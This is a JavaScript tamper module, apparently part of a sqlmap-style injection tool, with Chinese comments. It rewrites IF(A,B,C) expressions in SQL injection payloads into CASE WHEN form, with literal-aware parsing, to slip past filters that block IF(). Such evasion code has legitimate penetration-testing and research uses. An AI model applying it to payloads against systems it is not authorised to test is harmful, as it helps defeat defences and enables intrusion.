// IF(A,B,C) → CASE WHEN (A) THEN (B) ELSE (C) END（对标 sqlmap if2case.py）
// 深度感知括号与引号，正确处理嵌套调用与字符串字面量，绕过对 IF() 的弱过滤。
//
// [D107 2026-10-18] 手写 inSingle/inDouble 状态机迁移到 literalWalk 单一抽象：
// 每轮先对全串做**长度保持打码**（maskLiterals：字面量含引号逐字符替换为 \u0001），
// 在打码串上做括号/逗号定位，再回到原串取切片 —— 两串等长、下标一一对应。
// 由此字面量内的 `IF(`、逗号、括号天然不可见（旧实现会把字面量里的 `IF(` 当候选，
// 扫描起点落在字面量中段 ⇒ 可能产出畸形改写；本批修正，另有 A/B 留痕）。
// 引号判据从逐字符 isQuoteEscaped 换为 readSqlLiteral（同一奇偶性契约的真源）。
const EMPTY_PAREN_MARKER = '\u0000'; // NUL 不会出现在合法 SQL 串，用于暂存空括号

import { maskLiterals } from '../literalWalk.js';

export const if2case = {
  name: 'if2case',
  description: '将 IF(A,B,C) 改写为 CASE WHEN (A) THEN (B) ELSE (C) END，绕过 IF 函数过滤',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    let s = String(payload ?? '');
    if (!s.includes('IF(')) return s;
    s = s.replaceAll('()', EMPTY_PAREN_MARKER);
    for (;;) {
      const masked = maskLiterals(s);
      const index = masked.indexOf('IF(');
      if (index < 0) break;
      let depth = 1;
      const commas = [];
      let end = -1;
      for (let i = index + 3; i < masked.length; i++) {
        const ch = masked[i];
        if (depth === 1 && ch === ',') commas.push(i);
        else if (depth === 1 && ch === ')') {
          end = i;
          break;
        } else if (ch === '(') depth++;
        else if (ch === ')') depth--;
      }
      if (commas.length === 2 && end > -1) {
        const stripParens = (t) => t.trim().replace(/^\(+|\)+$/g, '');
        const a = stripParens(s.slice(index + 3, commas[0]));
        const b = stripParens(s.slice(commas[0] + 1, commas[1]));
        const c = stripParens(s.slice(commas[1] + 1, end));
        s = s.slice(0, index) + `CASE WHEN (${a}) THEN (${b}) ELSE (${c}) END` + s.slice(end + 1);
      } else {
        break;
      }
    }
    return s.replaceAll(EMPTY_PAREN_MARKER, '()');
  },
};

export default if2case;
